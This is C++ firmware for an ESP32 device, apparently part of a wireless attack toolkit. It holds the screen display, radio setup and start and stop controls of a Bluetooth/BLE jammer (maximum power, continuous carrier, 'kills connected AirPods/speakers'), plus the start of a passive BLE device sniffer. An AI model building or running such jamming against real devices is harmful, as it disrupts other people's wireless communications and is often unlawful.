// Helper to draw centered FreeFont text (Proto Kill style)
static void bjDrawFreeFont(int y, const char* text, uint16_t color, const GFXfont* font) {
    tft.setFreeFont(font);
    tft.setTextColor(color, TFT_BLACK);
    int w = tft.textWidth(text);
    int x = (SCREEN_WIDTH - w) / 2;
    if (x < 0) x = 0;
    tft.setCursor(x, y);
    tft.print(text);
    tft.setFreeFont(NULL);
}

// Chromatic aberration / glitch text - corrupted hacker aesthetic
static void bjDrawGlitchText(int y, const char* text, const GFXfont* font) {
    tft.setFreeFont(font);
    int w = tft.textWidth(text);
    int x = (SCREEN_WIDTH - w) / 2;
    if (x < 0) x = 0;

    // Pass 1: Cyan ghost offset left-up
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(x - 1, y - 1);
    tft.print(text);

    // Pass 2: Hot pink ghost offset right-down
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(x + 1, y + 1);
    tft.print(text);

    // Pass 3: White main text on top
    tft.setTextColor(TFT_WHITE);
    tft.setCursor(x, y);
    tft.print(text);

    tft.setFreeFont(NULL);
}

static void drawBjMainUI() {
    // Clear main area
    tft.fillRect(0, 38, SCREEN_WIDTH, 115, TFT_BLACK);

    // Title line (Proto Kill style)
    tft.drawLine(0, 38, SCREEN_WIDTH, 38, HALEHOUND_HOTPINK);
    tft.setFreeFont(NULL);
    tft.setTextSize(1);
    tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
    tft.setCursor(70, 45);
    tft.print("BLE JAMMER");
    tft.drawLine(0, 56, SCREEN_WIDTH, 56, HALEHOUND_HOTPINK);

    // Rounded frame for main content (Proto Kill style)
    tft.drawRoundRect(10, 60, CONTENT_INNER_W, 70, 8, HALEHOUND_VIOLET);
    tft.drawRoundRect(11, 61, CONTENT_INNER_W - 2, 68, 7, HALEHOUND_GUNMETAL);

    // Mode Name - Nosifer18pt with glitch effect
    tft.fillRect(15, 65, SCREEN_WIDTH - 30, 30, TFT_BLACK);
    bjDrawGlitchText(90, BJ_MODE_DISPLAY[currentMode], &Nosifer_Regular12pt7b);

    // Status - Nosifer12pt
    tft.fillRect(15, 100, SCREEN_WIDTH - 30, 25, TFT_BLACK);
    if (jamming) {
        bjDrawFreeFont(120, "JAMMING", HALEHOUND_HOTPINK, &Nosifer_Regular10pt7b);
    } else {
        bjDrawFreeFont(120, "STANDBY", HALEHOUND_GUNMETAL, &Nosifer_Regular10pt7b);
    }

    // Stats line - default font
    tft.setFreeFont(NULL);
    tft.fillRect(0, SCALE_Y(135), SCREEN_WIDTH, 15, TFT_BLACK);
    tft.setTextSize(1);
    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
    tft.setCursor(10, SCALE_Y(140));
    tft.printf("CH:%03d", currentNRFChannel);
    tft.setTextColor(jamming ? HALEHOUND_HOTPINK : HALEHOUND_VIOLET, TFT_BLACK);
    tft.setCursor(SCALE_X(80), SCALE_Y(140));
    tft.printf("CH#:%d", bjModes[currentMode].count);
    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
    tft.setCursor(SCALE_X(170), SCALE_Y(140));
    tft.printf("HITS:%d", bjHitCount);

    // Separator before equalizer
    tft.drawLine(0, 152, SCREEN_WIDTH, 152, HALEHOUND_HOTPINK);
}

static void bjUpdateStatus() {
    // Fast partial update - content inside the frame only
    tft.fillRect(15, 65, SCREEN_WIDTH - 30, 60, TFT_BLACK);
    bjDrawGlitchText(90, BJ_MODE_DISPLAY[currentMode], &Nosifer_Regular12pt7b);
    if (jamming) {
        bjDrawFreeFont(120, "JAMMING", HALEHOUND_HOTPINK, &Nosifer_Regular10pt7b);
    } else {
        bjDrawFreeFont(120, "STANDBY", HALEHOUND_GUNMETAL, &Nosifer_Regular10pt7b);
    }
}

static void bjUpdateStats() {
    // Fast partial update - stats line only
    // Use padded printf with background color to overwrite old text — NO fillRect flicker
    tft.setFreeFont(NULL);
    tft.setTextSize(1);
    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
    tft.setCursor(10, SCALE_Y(140));
    tft.printf("CH:%03d  ", currentNRFChannel);
    tft.setTextColor(jamming ? HALEHOUND_HOTPINK : HALEHOUND_VIOLET, TFT_BLACK);
    tft.setCursor(SCALE_X(80), SCALE_Y(140));
    tft.printf("CH#:%-3d ", bjModes[currentMode].count);
    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
    tft.setCursor(SCALE_X(170), SCALE_Y(140));
    tft.printf("HITS:%-5d", bjHitCount);
}

// Forward declaration
static void drawAdvMarkers();

// ═══════════════════════════════════════════════════════════════════════════
// EQUALIZER HEAT LOGIC (matches WLAN/SubGHz Jammer pattern)
// ═══════════════════════════════════════════════════════════════════════════

static void updateChannelHeat() {
    if (!jamming) {
        // Decay all channels when not jamming
        for (int i = 0; i < BJ_NUM_BARS; i++) {
            if (channelHeat[i] > 0) {
                channelHeat[i] = channelHeat[i] / 2;  // Fast decay when stopped
            }
        }
        return;
    }

    if (currentMode == BJ_MODE_BLE || currentMode == BJ_MODE_BT) {
        // BLE/BT modes - band hopping, insane equalizer
        for (int i = 0; i < BJ_NUM_BARS; i++) {
            int dist = abs(i - currentNRFChannel);

            if (i == currentNRFChannel) {
                // Direct hit - MAX HEAT
                channelHeat[i] = 125;
            } else if (dist <= 6) {
                // Splash zone - strong heat with falloff
                int splash = 110 - (dist * 12);
                channelHeat[i] = (channelHeat[i] + splash) / 2;
            } else {
                // Background chaos - all bars dance randomly
                int chaos = 50 + random(40);
                channelHeat[i] = (channelHeat[i] + chaos) / 2;
            }
        }
    } else {
        // BLE ADV mode - focused attack on advertising channels
        for (int i = 0; i < BJ_NUM_BARS; i++) {
            bool isCurrentChannel = (i == currentNRFChannel);

            // Distance to nearest ADV channel
            int distToNearest = BJ_NUM_BARS;
            for (int a = 0; a < BJ_ADV_COUNT; a++) {
                int d = abs(i - (int)BJ_ADV_CHANNELS[a]);
                if (d < distToNearest) distToNearest = d;
            }

            if (isCurrentChannel) {
                // Currently being hit - MAX HEAT
                channelHeat[i] = 125;
            } else if (bjIsAdvChannel(i)) {
                // Other ADV channels stay warm
                int baseHeat = 70 + random(30);
                channelHeat[i] = (channelHeat[i] + baseHeat) / 2;
            } else if (distToNearest <= 4) {
                // Splash zone around ADV channels
                int splash = 60 - (distToNearest * 12);
                if (splash < 10) splash = 10;
                channelHeat[i] = (channelHeat[i] + splash) / 2;
            } else {
                // Background - subtle decay
                if (channelHeat[i] > 0) {
                    channelHeat[i] = (channelHeat[i] * 3) / 4;
                }
            }
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// EQUALIZER DISPLAY (85 skinny bars - matches WLAN/SubGHz Jammer)
// ═══════════════════════════════════════════════════════════════════════════

static bool bjStandbyDrawn = false;  // Track if standby screen is already drawn

static void drawJammerDisplay() {
    // Update heat levels first
    updateChannelHeat();

    int maxBarH = BJ_GRAPH_HEIGHT - 25;

    if (!jamming) {
        // Check if any heat remains (for decay animation)
        bool hasHeat = false;
        for (int i = 0; i < BJ_NUM_BARS; i++) {
            if (channelHeat[i] > 3) { hasHeat = true; break; }
        }

        if (!hasHeat) {
            // Standby — only draw once, then skip until state changes
            if (bjStandbyDrawn) return;

            tft.fillRect(BJ_GRAPH_X, BJ_GRAPH_Y, BJ_GRAPH_WIDTH, BJ_GRAPH_HEIGHT, TFT_BLACK);
            tft.drawRect(BJ_GRAPH_X - 1, BJ_GRAPH_Y - 1, BJ_GRAPH_WIDTH + 2, BJ_GRAPH_HEIGHT + 2, HALEHOUND_MAGENTA);

            for (int i = 0; i < BJ_NUM_BARS; i++) {
                int x = BJ_GRAPH_X + (i * BJ_GRAPH_WIDTH / BJ_NUM_BARS);
                int barH = 8 + (i % 5) * 2;
                int barY = BJ_GRAPH_Y + BJ_GRAPH_HEIGHT - barH - 10;
                tft.drawFastVLine(x, barY, barH, HALEHOUND_GUNMETAL);
                tft.drawFastVLine(x + 1, barY, barH, HALEHOUND_GUNMETAL);
            }

            tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
            tft.setTextSize(1);
            tft.setCursor(BJ_GRAPH_X + 85, BJ_GRAPH_Y + 5);
            tft.print("STANDBY");

            drawAdvMarkers();
            bjStandbyDrawn = true;
            return;
        }
    }

    // Active or decaying — clear and redraw
    bjStandbyDrawn = false;

    tft.fillRect(BJ_GRAPH_X, BJ_GRAPH_Y, BJ_GRAPH_WIDTH, BJ_GRAPH_HEIGHT, TFT_BLACK);
    tft.drawRect(BJ_GRAPH_X - 1, BJ_GRAPH_Y - 1, BJ_GRAPH_WIDTH + 2, BJ_GRAPH_HEIGHT + 2, HALEHOUND_MAGENTA);

    // ═══════════════════════════════════════════════════════════════════════
    // DRAW THE EQUALIZER - 85 skinny bars of FIRE!
    // ═══════════════════════════════════════════════════════════════════════
    for (int i = 0; i < BJ_NUM_BARS; i++) {
        int x = BJ_GRAPH_X + (i * BJ_GRAPH_WIDTH / BJ_NUM_BARS);
        uint8_t heat = channelHeat[i];

        // Bar height based on heat - MORE AGGRESSIVE scaling
        int barH = (heat * maxBarH) / 100;  // Taller bars!
        if (barH > maxBarH) barH = maxBarH;
        if (barH < 8) barH = 8;  // Higher minimum

        int barY = BJ_GRAPH_Y + BJ_GRAPH_HEIGHT - barH - 8;

        // Color based on heat - vibrant gradient from cyan to hot pink
        for (int y = 0; y < barH; y++) {
            float heightRatio = (float)y / (float)barH;
            float heatRatio = (float)heat / 125.0f;

            // More aggressive color gradient
            float ratio = heightRatio * (0.3f + heatRatio * 0.7f);
            if (ratio > 1.0f) ratio = 1.0f;

            // Cyan (0, 207, 255) -> Hot Pink (255, 28, 82)
            uint8_t r = (uint8_t)(ratio * 255);
            uint8_t g = 207 - (uint8_t)(ratio * (207 - 28));
            uint8_t b = 255 - (uint8_t)(ratio * (255 - 82));
            uint16_t color = tft.color565(r, g, b);

            tft.drawFastHLine(x, barY + barH - 1 - y, 2, color);
        }

        // Add glow effect at base for hot bars
        if (heat > 80) {
            tft.drawFastHLine(x, barY + barH, 2, HALEHOUND_HOTPINK);
            tft.drawFastHLine(x, barY + barH + 1, 2, tft.color565(128, 14, 41));
        }
    }

    // ADV channel markers
    drawAdvMarkers();

    // Current frequency display
    if (jamming) {
        tft.fillRect(BJ_GRAPH_X + 50, BJ_GRAPH_Y + 2, 140, 12, TFT_BLACK);
        tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
        tft.setTextSize(1);
        tft.setCursor(BJ_GRAPH_X + 55, BJ_GRAPH_Y + 3);
        tft.printf(">>> %d MHz <<<", 2400 + currentNRFChannel);
    }
}

// Draw BLE advertising channel markers below the equalizer bars
static void drawAdvMarkers() {
    int markerY = BJ_GRAPH_Y + BJ_GRAPH_HEIGHT - 8;

    // ADV37 = NRF ch 2 (bar 2)
    int x37 = BJ_GRAPH_X + (2 * BJ_GRAPH_WIDTH / BJ_NUM_BARS);
    // ADV38 = NRF ch 26 (bar 26)
    int x38 = BJ_GRAPH_X + (26 * BJ_GRAPH_WIDTH / BJ_NUM_BARS);
    // ADV39 = NRF ch 80 (bar 80)
    int x39 = BJ_GRAPH_X + (80 * BJ_GRAPH_WIDTH / BJ_NUM_BARS);

    tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
    tft.setTextSize(1);
    tft.setCursor(x37, markerY);
    tft.print("37");
    tft.setCursor(x38, markerY);
    tft.print("38");
    tft.setTextColor(HALEHOUND_VIOLET, TFT_BLACK);
    tft.setCursor(x39 - 4, markerY);
    tft.print("39");
}

// ═══════════════════════════════════════════════════════════════════════════
// SKULL ROWS - 3x8 with frequency-tracking red indicator
// Active frequency skull turns RED, adjacent skulls glow orange
// ═══════════════════════════════════════════════════════════════════════════

static void drawSkulls() {
    int skullStartX = 10;
    int skullSpacing = (SCREEN_WIDTH - 20) / BJ_SKULL_NUM;

    // Map current NRF channel (2-80) to skull position (0-7)
    int activeSkull = ((currentNRFChannel - BJ_BT_NRF_START) * BJ_SKULL_NUM) / (BJ_BT_NRF_END - BJ_BT_NRF_START + 1);
    if (activeSkull >= BJ_SKULL_NUM) activeSkull = BJ_SKULL_NUM - 1;
    if (activeSkull < 0) activeSkull = 0;

    for (int row = 0; row < BJ_SKULL_ROWS; row++) {
        int rowY = BJ_SKULL_Y + (row * BJ_SKULL_ROW_SPACING);

        for (int i = 0; i < BJ_SKULL_NUM; i++) {
            int x = skullStartX + (i * skullSpacing);
            tft.fillRect(x, rowY, 16, 16, TFT_BLACK);

            uint16_t color;
            if (jamming) {
                int dist = abs(i - activeSkull);

                if (dist == 0) {
                    // ACTIVE FREQUENCY SKULL - PULSING BRIGHT RED
                    int pulse = (skullFrame + (row * 2)) % 4;
                    uint8_t brightness = 180 + (pulse * 25);
                    color = tft.color565(brightness, 0, 0);
                } else if (dist == 1) {
                    // ADJACENT SKULLS - ORANGE/RED GLOW
                    int pulse = (skullFrame + i + (row * 3)) % 6;
                    uint8_t r = 200 + (pulse * 9);
                    uint8_t g = 40 + (pulse * 8);
                    color = tft.color565(r, g, 0);
                } else {
                    // Normal cyan-to-hot-pink wave for distant skulls
                    int phase = (skullFrame + i + (row * 3)) % 8;
                    if (phase < 4) {
                        float ratio = phase / 3.0f;
                        uint8_t r = (uint8_t)(ratio * 255);
                        uint8_t g = 207 - (uint8_t)(ratio * (207 - 28));
                        uint8_t b = 255 - (uint8_t)(ratio * (255 - 82));
                        color = tft.color565(r, g, b);
                    } else {
                        float ratio = (phase - 4) / 3.0f;
                        uint8_t r = 255 - (uint8_t)(ratio * 255);
                        uint8_t g = 28 + (uint8_t)(ratio * (207 - 28));
                        uint8_t b = 82 + (uint8_t)(ratio * (255 - 82));
                        color = tft.color565(r, g, b);
                    }
                }
            } else {
                color = HALEHOUND_GUNMETAL;  // Gray when inactive
            }

            tft.drawBitmap(x, rowY, bjSkulls[i], 16, 16, color);
        }

        // Status text next to skulls on first row only
        if (row == 0) {
            tft.fillRect(skullStartX + (BJ_SKULL_NUM * skullSpacing), rowY, 50, 16, TFT_BLACK);
            tft.setTextColor(jamming ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL, TFT_BLACK);
            tft.setTextSize(1);
            tft.setCursor(skullStartX + (BJ_SKULL_NUM * skullSpacing) + 5, rowY + 4);
            tft.print(jamming ? "TX!" : "OFF");
        }
    }

    skullFrame++;
}

// ═══════════════════════════════════════════════════════════════════════════
// JAMMING CONTROL
// ═══════════════════════════════════════════════════════════════════════════

static void startJamming() {
    // ═══════════════════════════════════════════════════════════════════════
    // DUAL-CORE CONTINUOUS WAVE JAMMER
    // Core 0: FreeRTOS task owns ALL SPI + NRF24. startConstCarrier() for
    //         100% duty cycle continuous wave, setChannel() for tight hopping.
    // Core 1: Display animations at full speed (separate HSPI bus).
    // Core 1 NEVER touches NRF24 while jam task is running.
    // ═══════════════════════════════════════════════════════════════════════

    // Set shared state BEFORE launching task
    hopIndex = 0;
    currentNRFChannel = bjModes[currentMode].channels[0];
    bjHitCount = 0;
    bjJamMode = currentMode;
    bjJamTaskDone = false;
    bjStandbyDrawn = false;  // Force standby redraw when jamming stops
    jamming = true;

    // Launch jam task on core 0 — task handles ALL SPI/radio init on that core
    bjJamTaskRunning = true;
    xTaskCreatePinnedToCore(bjJamTask, "BleJam", 8192, NULL, 1, &bjJamTaskHandle, 0);

    Serial.printf("[BLEJAM] DUAL-CORE Started - Mode: %s, Channels: %d, Core0 task launched\n",
                  BJ_MODE_NAMES[currentMode], bjModes[currentMode].count);
}

static void stopJamming() {
    // Signal jam task to stop — task does its own radio cleanup on core 0
    bjJamTaskRunning = false;

    // Wait for task to finish cleanup (it powers down radio + releases SPI)
    if (bjJamTaskHandle) {
        unsigned long waitStart = millis();
        while (!bjJamTaskDone && (millis() - waitStart < 500)) {
            vTaskDelay(10 / portTICK_PERIOD_MS);
        }
        bjJamTaskHandle = NULL;
    }

    // Re-init SPI on core 1 for other modules (scanner, mousejacker, etc.)
    delay(2);
    SPI.begin(RADIO_SPI_SCK, RADIO_SPI_MISO, RADIO_SPI_MOSI, NRF24_CSN);
    nrf24Radio.begin();
    nrf24Radio.setPALevel(RF24_PA_MAX);
    nrf24Radio.setDataRate(RF24_2MBPS);
    nrf24Radio.setAutoAck(false);
    nrf24Radio.disableCRC();

    jamming = false;
    Serial.println("[BLEJAM] Stopped — core 0 task terminated, SPI restored to core 1");
}

static void nextMode() {
    currentMode = (currentMode + 1) % BJ_MODE_COUNT;
    hopIndex = 0;
    bjJamMode = currentMode;  // sync to jam task (volatile, task picks up next iteration)
}

static void prevMode() {
    currentMode = (currentMode - 1 + BJ_MODE_COUNT) % BJ_MODE_COUNT;
    hopIndex = 0;
    bjJamMode = currentMode;  // sync to jam task
}

// ═══════════════════════════════════════════════════════════════════════════
// SETUP
// ═══════════════════════════════════════════════════════════════════════════

void setup() {
    exitRequested = false;
    jamming = false;
    currentMode = BJ_MODE_BLE;    // Default BLE — kills connected AirPods/speakers
    currentNRFChannel = BJ_BT_NRF_START;
    hopIndex = 0;
    skullFrame = 0;
    bjHitCount = 0;
    memset(channelHeat, 0, sizeof(channelHeat));

    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();
    drawIconBar();

    #if CYD_DEBUG
    Serial.println("[BLEJAM] Initializing BLE Jammer...");
    #endif

    nrf24ClaimSPI();
    if (!nrf24Radio.begin()) {
        tft.setTextColor(HALEHOUND_HOTPINK);
        tft.setTextSize(2);
        drawCenteredText(100, "NRF24 NOT FOUND", HALEHOUND_HOTPINK, 2);
        tft.setTextSize(1);
        drawCenteredText(130, "Check wiring:", HALEHOUND_MAGENTA, 1);
        drawCenteredText(145, ("CE=GPIO" + String(NRF24_CE) + " CSN=GPIO" + String(NRF24_CSN)).c_str(), HALEHOUND_MAGENTA, 1);
        initialized = false;
        return;
    }

    // Max power, 2Mbps, no auto-ack, no CRC — maximum aggression
    nrf24Radio.setPALevel(RF24_PA_MAX);
    nrf24Radio.setDataRate(RF24_2MBPS);
    nrf24Radio.setAutoAck(false);
    nrf24Radio.disableCRC();

    Serial.printf("[BLEJAM] NRF24 INIT OK - isPVariant: %d, chipConnected: %d\n",
                  nrf24Radio.isPVariant(), nrf24Radio.isChipConnected());
    Serial.printf("[BLEJAM] CE=GPIO%d, CSN=GPIO%d, SPI: SCK=%d MISO=%d MOSI=%d\n",
                  NRF24_CE, NRF24_CSN, RADIO_SPI_SCK, RADIO_SPI_MISO, RADIO_SPI_MOSI);

    drawBjMainUI();
    drawJammerDisplay();
    drawSkulls();

    lastDisplayTime = millis();
    initialized = true;

    #if CYD_DEBUG
    Serial.println("[BLEJAM] NRF24 initialized - BLE Jammer ready");
    #endif
}

// ═══════════════════════════════════════════════════════════════════════════
// MAIN LOOP
// ═══════════════════════════════════════════════════════════════════════════

void loop() {
    if (!initialized) {
        // NRF24 not found - just check for exit
        touchButtonsUpdate();
        uint16_t tx, ty;
        if (getTouchPoint(&tx, &ty) || buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
            exitRequested = true;
        }
        return;
    }

    touchButtonsUpdate();

    // ═══════════════════════════════════════════════════════════════════════
    // TOUCH HANDLING - with release detection (prevents repeat triggers)
    // Icons: Back=10, Toggle=60, PrevMode=105, NextMode=140, Antenna=180, Cycle=215
    // ═══════════════════════════════════════════════════════════════════════
    uint16_t tx, ty;
    if (getTouchPoint(&tx, &ty)) {
        // Icon bar area
        if (ty >= ICON_BAR_Y && ty <= (ICON_BAR_BOTTOM + 4)) {
            // Wait for touch release to prevent repeated triggers
            waitForTouchRelease();

            // Back icon (x=10)
            if (tx >= 5 && tx <= 30) {
                if (jamming) stopJamming();
                exitRequested = true;
                return;
            }
            // Toggle icon (x=60)
            else if (tx >= 50 && tx <= 80) {
                if (jamming) stopJamming(); else startJamming();
                drawIconBar();
                drawBjMainUI();
                return;
            }
            // Prev mode icon (x=105)
            else if (tx >= 95 && tx <= 125) {
                prevMode();
                drawBjMainUI();
                return;
            }
            // Next mode icon (x=140)
            else if (tx >= 130 && tx <= 160) {
                nextMode();
                drawBjMainUI();
                return;
            }
            // Antenna icon (x=180) - visual indicator only
            else if (tx >= 170 && tx <= 200) {
                return;
            }
            // Cycle mode icon at right edge
            else if (tx >= (tft.width() - 35) && tx <= tft.width()) {
                nextMode();
                drawBjMainUI();
                return;
            }
        }
    }

    // Hardware button fallback
    if (buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
        if (jamming) stopJamming();
        exitRequested = true;
        return;
    }

    // ═══════════════════════════════════════════════════════════════════════
    // JAMMING ENGINE — RUNS ON CORE 0 (FreeRTOS task)
    // The jam task (bjJamTask) handles all NRF24 operations on core 0
    // using VSPI. Display runs here on core 1 using HSPI. Zero conflict.
    // No burst/pause pattern needed — jammer is 100% duty cycle.
    // ═══════════════════════════════════════════════════════════════════════

    // ═══════════════════════════════════════════════════════════════════════
    // DISPLAY UPDATE — Full animations ALL the time!
    // Jammer runs on core 0 with its own SPI bus. Display doesn't affect it.
    // Equalizer, skulls, stats — everything runs at full speed.
    // ═══════════════════════════════════════════════════════════════════════
    unsigned long displayInterval = jamming ? 80 : 200;  // Idle: 5fps (no flicker)
    if (millis() - lastDisplayTime >= displayInterval) {
        bjUpdateStats();
        drawJammerDisplay();
        drawSkulls();
        lastDisplayTime = millis();
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// LIFECYCLE
// ═══════════════════════════════════════════════════════════════════════════

bool isExitRequested() {
    return exitRequested;
}

void cleanup() {
    // Kill jam task on core 0 first
    if (jamming || bjJamTaskRunning) {
        stopJamming();
    }
    nrf24Radio.powerDown();
    delay(2);
    nrf24ReleaseSPI();
    initialized = false;
    exitRequested = false;

    #if CYD_DEBUG
    Serial.println("[BLEJAM] Cleanup complete — core 0 task terminated");
    #endif
}

}  // namespace BleJammer


// ═══════════════════════════════════════════════════════════════════════════
// BLE SNIFFER IMPLEMENTATION - Continuous BLE Advertisement Monitor
// Passive scanning, live device tracking, vendor ID, type classification
// ═══════════════════════════════════════════════════════════════════════════

namespace BleSniffer {

// ── State ────────────────────────────────────────────────────────────────
static bool initialized = false;
static bool exitRequested = false;
static bool scanning = false;
static bool detailView = false;
static BLEScan* pBleScan = nullptr;

// ── Device storage ───────────────────────────────────────────────────────
struct BleDevice {
    uint8_t  mac[6];
    int8_t   rssi;
    int8_t   rssiMin;
    int8_t   rssiMax;
    char     name[17];       // 16 chars + null
    char     vendor[8];      // 7 chars + null
    uint16_t companyId;      // BT SIG company ID from manufacturer data (0xFFFF = none)
    uint32_t firstSeen;
    uint32_t lastSeen;
    uint16_t frameCount;
    uint8_t  mfgData[8];    // First 8 bytes of manufacturer data
    uint8_t  mfgDataLen;
    bool     hasName;
    bool     randomMAC;
};

#define BSNIFF_MAX_DEVICES 62
#define BSNIFF_MAX_VISIBLE ((SCALE_Y(199)) / SCALE_H(20))
#define BSNIFF_ITEM_HEIGHT SCALE_H(20)

static BleDevice devices[BSNIFF_MAX_DEVICES];
static int deviceCount = 0;
static int currentIndex = 0;
static int listStartIndex = 0;
static uint32_t scanStartTime = 0;
static unsigned long lastDisplayUpdate = 0;

// ── Filter modes ─────────────────────────────────────────────────────────
enum SniffFilter : uint8_t {
    FILT_ALL = 0,
    FILT_NAMED,
    FILT_APPLE,
    FILT_STRONG,
    FILT_COUNT
};
static SniffFilter currentFilter = FILT_ALL;
static const char* filterNames[] = {"ALL", "NAMED", "APPLE", "STRONG"};

// ── Volatile queue (callback → loop) ─────────────────────────────────────
static volatile bool pendingReady = false;
static uint8_t  pendingMAC[6];
static int8_t   pendingRSSI = 0;
static char     pendingName[17];
static bool     pendingHasName = false;
static uint8_t  pendingMfgData[8];
static uint8_t  pendingMfgLen = 0;

// ── Icon bar ─────────────────────────────────────────────────────────────
#define BSNIFF_ICON_SIZE 16
#define BSNIFF_ICON_NUM 6
static int bsniffIconX[BSNIFF_ICON_NUM] = {SCALE_X(10), SCALE_X(55), SCALE_X(100), SCALE_X(135), SCALE_X(175), SCALE_X(215)};
static const unsigned char* bsniffIcons[BSNIFF_ICON_NUM] = {
    bitmap_icon_go_back,     // 0: back
    bitmap_icon_start,       // 1: scan toggle
    bitmap_icon_LEFT,        // 2: filter left
    bitmap_icon_RIGHT,       // 3: filter right
    bitmap_icon_eye2,        // 4: detail view
    bitmap_icon_ble          // 5: BLE pulse indicator
};

// ── Forward declarations ─────────────────────────────────────────────────
static void drawIconBar();
static void drawHeader();
static void drawColumnHeaders();
static void drawDeviceList();
static void drawStatsLine();
static void drawButtonBar();
static void drawFullUI();
static void showDeviceDetail(int idx);
static void handleTouch();
static int  countFiltered();

// ═══════════════════════════════════════════════════════════════════════════
// OUI VENDOR LOOKUP (own copy — same entries as StationScan)
// ═══════════════════════════════════════════════════════════════════════════

static const char* lookupVendor(uint8_t* mac) {
    if (mac[0] & 0x02) return "Random";

    // Apple OUIs
    if (mac[0] == 0x00 && mac[1] == 0x1C && mac[2] == 0xB3) return "Apple";
    if (mac[0] == 0xF0 && mac[1] == 0x18 && mac[2] == 0x98) return "Apple";
    if (mac[0] == 0xAC && mac[1] == 0xDE && mac[2] == 0x48) return "Apple";
    if (mac[0] == 0xA4 && mac[1] == 0x83 && mac[2] == 0xE7) return "Apple";
    if (mac[0] == 0x3C && mac[1] == 0x06 && mac[2] == 0x30) return "Apple";
    if (mac[0] == 0x14 && mac[1] == 0x98 && mac[2] == 0x77) return "Apple";
    if (mac[0] == 0xDC && mac[1] == 0xA4 && mac[2] == 0xCA) return "Apple";
    if (mac[0] == 0x78 && mac[1] == 0x7B && mac[2] == 0x8A) return "Apple";
    if (mac[0] == 0x38 && mac[1] == 0xC9 && mac[2] == 0x86) return "Apple";
    if (mac[0] == 0xBC && mac[1] == 0x6C && mac[2] == 0x21) return "Apple";
    if (mac[0] == 0x40 && mac[1] == 0xB3 && mac[2] == 0x95) return "Apple";
    if (mac[0] == 0x6C && mac[1] == 0x94 && mac[2] == 0xF8) return "Apple";

    // Samsung
    if (mac[0] == 0x00 && mac[1] == 0x07 && mac[2] == 0xAB) return "Samsng";
    if (mac[0] == 0x00 && mac[1] == 0x16 && mac[2] == 0x6C) return "Samsng";
    if (mac[0] == 0x00 && mac[1] == 0x1A && mac[2] == 0x8A) return "Samsng";
    if (mac[0] == 0x00 && mac[1] == 0x26 && mac[2] == 0x37) return "Samsng";
    if (mac[0] == 0xE8 && mac[1] == 0x50 && mac[2] == 0x8B) return "Samsng";
    if (mac[0] == 0x8C && mac[1] == 0x77 && mac[2] == 0x12) return "Samsng";
    if (mac[0] == 0xCC && mac[1] == 0x07 && mac[2] == 0xAB) return "Samsng";

    // Google
    if (mac[0] == 0x3C && mac[1] == 0x5A && mac[2] == 0xB4) return "Google";
    if (mac[0] == 0xF4 && mac[1] == 0xF5 && mac[2] == 0xD8) return "Google";
    if (mac[0] == 0x54 && mac[1] == 0x60 && mac[2] == 0x09) return "Google";

    // Intel
    if (mac[0] == 0x00 && mac[1] == 0x1B && mac[2] == 0x21) return "Intel";
    if (mac[0] == 0x00 && mac[1] == 0x1E && mac[2] == 0x64) return "Intel";
    if (mac[0] == 0x68 && mac[1] == 0x05 && mac[2] == 0xCA) return "Intel";
    if (mac[0] == 0x3C && mac[1] == 0x6A && mac[2] == 0xA7) return "Intel";
    if (mac[0] == 0x80 && mac[1] == 0x86 && mac[2] == 0xF2) return "Intel";

    // Espressif
    if (mac[0] == 0x24 && mac[1] == 0x0A && mac[2] == 0xC4) return "ESP";
    if (mac[0] == 0xA4 && mac[1] == 0xCF && mac[2] == 0x12) return "ESP";
    if (mac[0] == 0x30 && mac[1] == 0xAE && mac[2] == 0xA4) return "ESP";
    if (mac[0] == 0xEC && mac[1] == 0xFA && mac[2] == 0xBC) return "ESP";
    if (mac[0] == 0x08 && mac[1] == 0x3A && mac[2] == 0xF2) return "ESP";
    if (mac[0] == 0x88 && mac[1] == 0x57 && mac[2] == 0x21) return "ESP";

    // Microsoft
    if (mac[0] == 0x00 && mac[1] == 0x50 && mac[2] == 0xF2) return "Msft";
    if (mac[0] == 0x28 && mac[1] == 0x18 && mac[2] == 0x78) return "Msft";
    if (mac[0] == 0x7C && mac[1] == 0x1E && mac[2] == 0x52) return "Msft";

    // Qualcomm
    if (mac[0] == 0x00 && mac[1] == 0x03 && mac[2] == 0x7A) return "Qcomm";

    // Broadcom
    if (mac[0] == 0x00 && mac[1] == 0x10 && mac[2] == 0x18) return "Brcm";

    // Realtek
    if (mac[0] == 0x00 && mac[1] == 0xE0 && mac[2] == 0x4C) return "Rtk";

    // Huawei
    if (mac[0] == 0x00 && mac[1] == 0x9A && mac[2] == 0xCD) return "Huawei";
    if (mac[0] == 0x00 && mac[1] == 0x46 && mac[2] == 0x4B) return "Huawei";
    if (mac[0] == 0x48 && mac[1] == 0x46 && mac[2] == 0xC1) return "Huawei";

    return "???";
}

// ═══════════════════════════════════════════════════════════════════════════
// DEVICE LABEL (from ble_database.h company ID lookup)
// ═══════════════════════════════════════════════════════════════════════════

// Extract company ID from manufacturer data (first 2 bytes, little-endian)
static uint16_t extractCompanyId(uint8_t* mfgData, uint8_t len) {
    if (len < 2) return 0xFFFF;
    return mfgData[0] | (mfgData[1] << 8);
}

// Get display label for device — uses ble_database.h for 94 companies
static const char* devDisplayLabel(uint16_t companyId, bool hasName) {
    if (companyId != 0xFFFF) {
        const char* name = lookupCompanyName(companyId);
        if (name) return name;
    }
    return hasName ? "Named" : "---";
}

// ═══════════════════════════════════════════════════════════════════════════
// DEVICE MANAGEMENT
// ═══════════════════════════════════════════════════════════════════════════

static int findDevice(uint8_t* mac) {
    for (int i = 0; i < deviceCount; i++) {
        if (memcmp(devices[i].mac, mac, 6) == 0) return i;
    }
    return -1;
}

